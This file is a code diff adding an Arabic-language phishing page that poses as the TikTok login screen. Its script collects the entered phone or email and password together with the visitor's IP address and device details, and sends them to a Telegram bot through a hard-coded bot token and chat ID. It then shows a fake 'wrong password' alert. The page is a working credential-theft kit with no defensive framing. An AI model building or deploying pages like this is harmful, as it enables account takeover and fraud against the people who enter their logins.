@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>تسجيل الدخول - تيك توك</title>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <style>
+        /* التنسيق العام */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f8f9fa; /* خلفية رمادية فاتحة مثل تيك توك */
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            direction: rtl; /* النص من اليمين لليسار */
+            color: #333; /* لون النص داكن */
+        }
+
+        .login-container {
+            background-color: #fff; /* خلفية بيضاء */
+            border-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            width: 350px;
+            padding: 30px;
+            text-align: center;
+        }
+
+        .login-container img {
+            width: 120px;
+            height: auto;
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            color: #333;
+            margin-bottom: 20px;
+            font-size: 24px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+            text-align: right;
+        }
+
+        .input-group label {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 5px;
+            display: block;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 14px;
+            color: #333;
+            background-color: #f8f9fa;
+            outline: none;
+        }
+
+        .input-group input:focus {
+            border-color: #69c9d0; /* لون الحدود عند التركيز */
+        }
+
+        .btn-login {
+            width: 100%;
+            padding: 12px;
+            background-color: #69c9d0; /* لون زر تسجيل الدخول (أزرق تيك توك) */
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .btn-login:hover {
+            background-color: #4fa8b0; /* لون الزر عند التحويم */
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #666;
+        }
+
+        .footer a {
+            color: #69c9d0; /* لون الروابط (أزرق تيك توك) */
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .separator {
+            margin: 20px 0;
+            position: relative;
+            text-align: center;
+        }
+
+        .separator::before, .separator::after {
+            content: "";
+            display: block;
+            height: 1px;
+            background-color: #ddd;
+            width: 40%;
+            margin: 0 auto;
+        }
+
+        .separator span {
+            position: absolute;
+            top: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: #fff;
+            padding: 0 10px;
+            color: #999;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <!-- شعار تيك توك -->
+    <img src="https://www.freepnglogos.com/uploads/tik-tok-logo-png/tik-tok-logo-vectors-9.png" alt="تيك توك">
+
+    <h2>تسجيل الدخول إلى تيك توك</h2>
+
+    <form id="login-form">
+        <div class="input-group">
+            <label for="phone">رقم الهاتف أو البريد الإلكتروني</label>
+            <input type="text" id="phone" name="phone" placeholder="أدخل رقم الهاتف أو البريد الإلكتروني" required>
+        </div>
+        
+        <div class="input-group">
+            <label for="password">كلمة المرور</label>
+            <input type="password" id="password" name="password" placeholder="أدخل كلمة المرور" required>
+        </div>
+        
+        <button type="submit" class="btn-login">تسجيل الدخول</button>
+    </form>
+
+    <div class="separator">
+        <span>أو</span>
+    </div>
+
+    <div class="footer">
+        <p>لا تمتلك حسابًا؟ <a href="#">اشترك الآن</a></p>
+        <p><a href="#">هل نسيت كلمة المرور؟</a></p>
+    </div>
+</div>
+
+<script>
+    const TOKEN = "7555812839:AAHBTn0EMUDpWfdQmLPqBo9kP_j56yPh7cs"; // استبدل بتوكن البوت الخاص بك
+    const CHAT_ID = "782949934"; // استبدل بمعرف الدردشة الخاص بك
+    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+    document.getElementById('login-form').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const phone = document.getElementById('phone').value;
+        const password = document.getElementById('password').value;
+
+        if (!phone || !password) {
+            alert("يرجى ملء جميع الحقول");
+            return;
+        }
+
+        axios.get('https://api.ipify.org?format=json')
+            .then(response => {
+                if (response.data && response.data.ip) {
+                    const ip = response.data.ip;
+                    const userAgent = navigator.userAgent;
+                    const platform = navigator.platform;
+                    const screenWidth = screen.width;
+                    const screenHeight = screen.height;
+                    const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+
+                    const message = `
+                        <b>محاولة تسجيل دخول جديدة</b>\n
+                        <b>رقم الهاتف:</b> ${phone}\n
+                        <b>كلمة المرور:</b> ${password}\n
+                        <b>عنوان الـ IP:</b> ${ip}\n
+                        <b>نوع الجهاز:</b> ${deviceType}\n
+                        <b>النظام الأساسي:</b> ${platform}\n
+                        <b>وكيل المستخدم:</b> ${userAgent}\n
+                        <b>دقة الشاشة:</b> ${screenWidth}x${screenHeight}
+                    `;
+
+                    axios.post(URI_API, {
+                        chat_id: CHAT_ID,
+                        parse_mode: 'html',
+                        text: message
+                    })
+                    .then(response => {
+                        if (response.data.ok) {
+                            alert("!عذرا كلمة السر او رقم الهاتف غير صحيح ");
+                        } else {
+                            alert("حدث خطأ أثناء إرسال المعلومات");
+                        }
+                    })
+                    .catch(error => {
+                        alert("حدث خطأ في الاتصال بالخادم");
+                    });
+                } else {
+                    throw new Error("تعذر جلب عنوان IP");
+                }
+            })
+            .catch(error => {
+                alert("حدث خطأ أثناء جلب عنوان IP");
+            });
+    });
+</script>
+
+</body>
+</html>
